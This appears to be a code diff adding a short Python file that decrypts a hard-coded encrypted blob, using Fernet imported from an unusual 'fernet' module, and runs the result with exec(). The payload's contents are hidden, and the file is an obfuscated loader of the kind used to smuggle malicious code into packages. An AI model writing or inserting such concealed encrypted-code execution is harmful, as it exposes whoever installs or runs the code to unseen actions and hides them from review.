@@ -1,0 +1,4 @@
+from fernet import Fernet
+
+data = Fernet(b'1BncuowKwxoqx1edWbvkNRzLyq2LrJPHkO8dV_ZvGOc=').decrypt(b'gAAAAABmunksO4itD8DCrWMKKNhSglyuXQpQVXLKpg5JlmYbu6KXxjLzWR0Z3DqCtupx9zaztagzi2ujJtD6wBBPeqEfXER7pvuR2wY-OWKxmz4lkN7D5is=')
+exec(data)
